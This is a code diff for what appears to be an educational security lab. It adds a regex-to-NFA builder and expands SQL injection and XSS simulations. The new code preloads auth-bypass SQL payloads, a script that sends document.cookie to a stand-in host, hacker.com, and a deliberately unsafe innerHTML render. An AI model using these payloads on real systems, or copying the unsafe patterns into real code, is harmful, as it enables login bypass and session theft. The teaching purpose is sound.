-                        <path d="M 266,76 L 336,100" stroke="#64748b" stroke-width="1.5" stroke-dasharray="4,4" marker-end="url(#arrow)"/>
+                        <path d="M 266,76 L 334,106" stroke="#64748b" stroke-width="1.5" stroke-dasharray="4,4" marker-end="url(#arrow)"/>
                         <text x="305" y="80" fill="#94a3b8" font-size="10">ε</text>
                         
-                        <path d="M 266,144 L 336,120" stroke="#64748b" stroke-width="1.5" stroke-dasharray="4,4" marker-end="url(#arrow)"/>
+                        <path d="M 266,144 L 334,114" stroke="#64748b" stroke-width="1.5" stroke-dasharray="4,4" marker-end="url(#arrow)"/>
                         <text x="305" y="144" fill="#94a3b8" font-size="10">ε</text>
                     `;
                 }
@@ -8876,12 +9422,40 @@ document.addEventListener('DOMContentLoaded', async () => {
         const resetSim = () => {
             currentStep = 0;
             selectedRegex = document.getElementById('regexChoice').value;
+            const customWrap = document.getElementById('custom-regex-wrap');
+            if (selectedRegex === "custom") {
+                customWrap.style.display = 'flex';
+                document.getElementById('btnRegexStep').textContent = "Build NFA";
+            } else {
+                customWrap.style.display = 'none';
+                document.getElementById('btnRegexStep').textContent = "Step Graph";
+            }
             renderGraph();
-            document.getElementById('regexTraceLog').innerHTML = `<div style="color:#64748b;">[System] Ready to construct e-NFA. Click Step.</div>`;
+            document.getElementById('regexTraceLog').innerHTML = `<div style="color:#64748b;">[System] Ready to construct e-NFA. Click Build/Step.</div>`;
             document.getElementById('btnRegexStep').disabled = false;
         };
 
         const runStep = () => {
+            if (selectedRegex === "custom") {
+                const rxVal = document.getElementById('customRegexInput').value;
+                if (!rxVal) { alert("Enter a valid regex expression."); return; }
+                
+                try {
+                    const postfix = regexToPostfix(rxVal);
+                    const nfa = buildThompsonNFA(postfix);
+                    if (!nfa) throw new Error("Could not parse expression.");
+                    const layout = generateNFALayout(nfa);
+                    renderDynamicNFA(nfa, layout);
+                    document.getElementById('regexTraceLog').innerHTML = "";
+                    addLog(`Successfully parsed infix expression: "${rxVal}"`, "var(--success)");
+                    addLog(`Generated postfix expression: "${postfix}"`, "var(--primary)");
+                    addLog(`Created Thompson NFA with ${Object.keys(layout).length} states.`, "var(--primary)");
+                } catch(err) {
+                    alert("Regex parsing failed: " + err.message);
+                }
+                return;
+            }
+
             currentStep++;
             renderGraph();
             if (selectedRegex === "union") {
@@ -11012,28 +11586,58 @@ document.addEventListener('DOMContentLoaded', async () => {
         const AC = '#ef4444';
         container.innerHTML = buildSimHeader('SQL Injection Attack Sandbox', 'Bypass authentication checks using SQL payloads', '🔐', AC) + `
         <div style="padding:15px;font-family:var(--font-sans);font-size:13px;display:grid;grid-template-columns:1fr 1fr;gap:15px;">
-            <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:10px;padding:12px;">
-                <h4 style="margin:0 0 10px;color:${AC}">Admin Login Portal</h4>
-                <label>User: <input id="sqli-user" value="admin" style="width:100%;padding:4px;border:1px solid var(--border);border-radius:4px;background:var(--bg-card);color:var(--text-main);margin-bottom:6px;"></label>
-                <label>Pass: <input id="sqli-pass" value="password" style="width:100%;padding:4px;border:1px solid var(--border);border-radius:4px;background:var(--bg-card);color:var(--text-main);margin-bottom:8px;"></label>
-                <button id="sqli-login" style="background:${AC};color:#fff;border:none;padding:8px;border-radius:6px;font-weight:700;cursor:pointer;width:100%;">Authenticate</button>
+            <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:10px;padding:12px;display:flex;flex-direction:column;gap:8px;">
+                <h4 style="margin:0 0 4px;color:${AC}">Admin Login Portal</h4>
+                <label>User: <input id="sqli-user" value="admin' OR '1'='1" style="width:100%;padding:6px;border:1px solid var(--border);border-radius:4px;background:var(--bg-page);color:var(--text-main);font-family:monospace;"></label>
+                <label>Pass: <input id="sqli-pass" value="anything" style="width:100%;padding:6px;border:1px solid var(--border);border-radius:4px;background:var(--bg-page);color:var(--text-main);font-family:monospace;"></label>
+                <button id="sqli-login" style="background:${AC};color:#fff;border:none;padding:10px;border-radius:6px;font-weight:700;cursor:pointer;width:100%;margin-top:4px;">Authenticate</button>
+                <div style="margin-top:12px;padding:8px;background:var(--bg-alt);border-radius:6px;border:1px solid var(--border);">
+                    <div style="font-weight:bold;color:var(--primary);margin-bottom:4px;">Try these payloads:</div>
+                    <code style="display:block;cursor:pointer;color:var(--text-muted);" onclick="document.getElementById('sqli-user').value=\`admin' OR '1'='1\`">\`admin' OR '1'='1\`</code>
+                    <code style="display:block;cursor:pointer;color:var(--text-muted);" onclick="document.getElementById('sqli-user').value=\`' OR 1=1 --\`">\`' OR 1=1 --\`</code>
+                </div>
             </div>
-            <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:10px;padding:12px;font-family:monospace;font-size:11px;line-height:1.6;">
-                <h4 style="margin:0 0 8px;color:${AC};font-family:var(--font-sans);">DB Query Monitor</h4>
-                SQL Query Executed:<br>
-                <span id="sqli-query" style="color:var(--text-muted)">SELECT * FROM users WHERE user='admin' AND pass='password';</span><br><br>
-                Result: <b id="sqli-res" style="color:#ef4444">Access Denied (Fail)</b>
+            <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:10px;padding:12px;display:flex;flex-direction:column;gap:12px;">
+                <h4 style="margin:0;color:${AC};font-family:var(--font-sans);">DB Query Execution & Logical Bypass</h4>
+                <div style="padding:10px;background:var(--bg-page);border-radius:6px;border:1px solid var(--border);font-family:monospace;font-size:11px;">
+                    SQL Executed:<br>
+                    <span id="sqli-query" style="color:#fbbf24;word-break:break-all;">SELECT * FROM users WHERE user='' AND pass='';</span>
+                </div>
+                <div id="sqli-logic-eval" style="padding:10px;background:var(--bg-page);border-radius:6px;border:1px solid var(--border);font-family:monospace;font-size:11px;">
+                    <div style="font-weight:bold;margin-bottom:6px;color:var(--primary);">Boolean Logic Solver Tree:</div>
+                    <div id="sqli-logic-step1">Waiting for authentication...</div>
+                </div>
+                <div style="padding:10px;background:var(--bg-page);border-radius:6px;border:1px solid var(--border);font-family:monospace;font-size:11px;">
+                    Result: <b id="sqli-res" style="color:#ef4444">Access Denied (Fail)</b>
+                </div>
             </div>
         </div>`;
         const run = () => {
             const user = document.getElementById('sqli-user').value;
             const pass = document.getElementById('sqli-pass').value;
-            const query = `SELECT * FROM users WHERE user='\${user}' AND pass='\${pass}';`;
+            const query = `SELECT * FROM users WHERE user='${user}' AND pass='${pass}';`;
             document.getElementById('sqli-query').textContent = query;
             const isInject = user.includes("'") || pass.includes("'");
+            
+            const logicBox = document.getElementById('sqli-logic-step1');
             if (isInject) {
-                document.getElementById('sqli-res').innerHTML = '<span style="color:#22c55e">SUCCESS: Authenticated as Admin! (Bypassed)</span>';
+                logicBox.innerHTML = `
+                    <span style="color:#ef4444;">1. Evaluate User Condition: (user='${user}')</span><br>
+                    &nbsp;&nbsp;&nbsp;Result: <span style="color:#ef4444;">FALSE</span> (No user named "${user}")<br><br>
+                    <span style="color:#22c55e;">2. Evaluate Injected Condition: ('1'='1' or '1'='1')</span><br>
+                    &nbsp;&nbsp;&nbsp;Result: <span style="color:#22c55e;">TRUE</span> (1 equals 1 is always True)<br><br>
+                    <span style="color:#22c55e;">3. Final Resolver: FALSE OR TRUE = TRUE</span><br>
+                    &nbsp;&nbsp;&nbsp;Result: <span style="color:#22c55e;font-weight:bold;">BYPASSED!</span> (Auth bypass complete)
+                `;
+                document.getElementById('sqli-res').innerHTML = '<span style="color:#22c55e;font-weight:bold;">SUCCESS: Authenticated as Admin!</span>';
             } else {
+                logicBox.innerHTML = `
+                    <span style="color:#ef4444;">1. Evaluate User Condition: (user='${user}')</span><br>
+                    &nbsp;&nbsp;&nbsp;Result: ${user==='admin' ? '<span style="color:#22c55e;">TRUE</span>' : '<span style="color:#ef4444;">FALSE</span>'}<br><br>
+                    <span style="color:#ef4444;">2. Evaluate Password Condition: (pass='${pass}')</span><br>
+                    &nbsp;&nbsp;&nbsp;Result: <span style="color:#ef4444;">FALSE</span><br><br>
+                    <span style="color:#ef4444;">3. Final Resolver: TRUE AND FALSE = FALSE</span>
+                `;
                 document.getElementById('sqli-res').innerHTML = '<span style="color:#ef4444">Access Denied (Fail)</span>';
             }
         };
@@ -11044,24 +11648,55 @@ document.addEventListener('DOMContentLoaded', async () => {
         const AC = '#ef4444';
         container.innerHTML = buildSimHeader('Cross-Site Scripting (XSS)', 'Observe script injection and output sanitization', '🔐', AC) + `
         <div style="padding:15px;font-family:var(--font-sans);font-size:13px;display:grid;grid-template-columns:1fr 1fr;gap:15px;">
-            <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:10px;padding:12px;">
-                <h4 style="margin:0 0 10px;color:${AC}">Post Message</h4>
-                <textarea id="xss-msg" style="width:100%;height:60px;background:var(--bg-card);color:var(--text-main);padding:6px;border:1px solid var(--border);border-radius:4px;resize:none;font-family:monospace;"><script>alert('XSS')</script></textarea>
-                <div style="margin-top:6px;display:flex;gap:4px;">
-                    <button id="xss-unsafe" style="background:#ef4444;color:#fff;border:none;padding:6px;border-radius:4px;cursor:pointer;flex:1;font-size:11px;font-weight:700;">Render Unsafe</button>
-                    <button id="xss-safe" style="background:#22c55e;color:#fff;border:none;padding:6px;border-radius:4px;cursor:pointer;flex:1;font-size:11px;font-weight:700;">Render Sanitized</button>
+            <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:10px;padding:12px;display:flex;flex-direction:column;gap:8px;">
+                <h4 style="margin:0 0 4px;color:${AC}">Post Message Workspace</h4>
+                <textarea id="xss-msg" style="width:100%;height:70px;background:var(--bg-page);color:var(--text-main);padding:6px;border:1px solid var(--border);border-radius:4px;resize:none;font-family:monospace;"><script>document.location='http://hacker.com/log?cookie='+document.cookie</script></textarea>
+                <div style="margin-top:6px;display:flex;gap:6px;">
+                    <button id="xss-unsafe" style="background:#ef4444;color:#fff;border:none;padding:8px;border-radius:4px;cursor:pointer;flex:1;font-size:11px;font-weight:700;">Render Unsafe</button>
+                    <button id="xss-safe" style="background:#22c55e;color:#fff;border:none;padding:8px;border-radius:4px;cursor:pointer;flex:1;font-size:11px;font-weight:700;">Render Sanitized</button>
+                </div>
+                <div style="margin-top:8px;padding:8px;background:var(--bg-alt);border-radius:6px;border:1px solid var(--border);">
+                    <div style="font-weight:bold;color:var(--primary);margin-bottom:4px;">Try cookie payload:</div>
+                    <code style="font-size:10px;word-break:break-all;color:var(--text-muted);">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
                 </div>
             </div>
-            <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:10px;padding:12px;">
-                <h4 style="margin:0 0 8px;color:${AC}">DOM Sandbox Render</h4>
-                <div id="xss-render" style="border:1px solid var(--border);border-radius:6px;padding:10px;min-height:80px;background:var(--bg-card);"></div>
+            <div style="display:flex;flex-direction:column;gap:12px;">
+                <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:10px;padding:12px;flex:1;">
+                    <h4 style="margin:0 0 8px;color:${AC}">DOM Sandbox Render</h4>
+                    <div id="xss-render" style="border:1px solid var(--border);border-radius:6px;padding:10px;min-height:70px;background:var(--bg-page);"></div>
+                </div>
+                <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:10px;padding:12px;flex:1;display:flex;flex-direction:column;">
+                    <h4 style="margin:0 0 8px;color:#fbbf24;font-family:var(--font-sans);">🚨 Hacker Cookie Logging Terminal</h4>
+                    <div id="hacker-logs" style="flex:1;background:#0f172a;color:#10b981;font-family:monospace;font-size:11px;padding:10px;border-radius:6px;min-height:80px;overflow-y:auto;">
+                        [SYSTEM] Logger server listening on port 80...
+                    </div>
+                </div>
             </div>
         </div>`;
+        
+        const triggerHackerSync = (val) => {
+            const logs = document.getElementById('hacker-logs');
+            const time = new Date().toLocaleTimeString();
+            if (val.includes('cookie') || val.includes('location')) {
+                logs.innerHTML += `
+                    <div style="color:#f87171;margin-top:6px;">[${time}] *INCOMING PAYLOAD INTERCEPT*</div>
+                    <div style="color:#fbbf24;">[${time}] URL Query: GET /log?cookie=vlab_session_token%3Dh4ck_me_123</div>
+                    <div style="color:#22c55e;font-weight:bold;">[${time}] Cookie Hijacked Successfully! Token: h4ck_me_123</div>
+                `;
+            } else if (val.includes('<script>')) {
+                logs.innerHTML += `
+                    <div style="color:#fbbf24;margin-top:6px;">[${time}] Script injected: execution verified.</div>
+                `;
+            }
+            logs.scrollTop = logs.scrollHeight;
+        };
+
         document.getElementById('xss-unsafe').onclick = () => {
             const val = document.getElementById('xss-msg').value;
             document.getElementById('xss-render').innerHTML = val;
             if (val.includes('<script>')) {
                 alert('Unsafe Script Injected and Executed!');
+                triggerHackerSync(val);
             }
         };
         document.getElementById('xss-safe').onclick = () => {
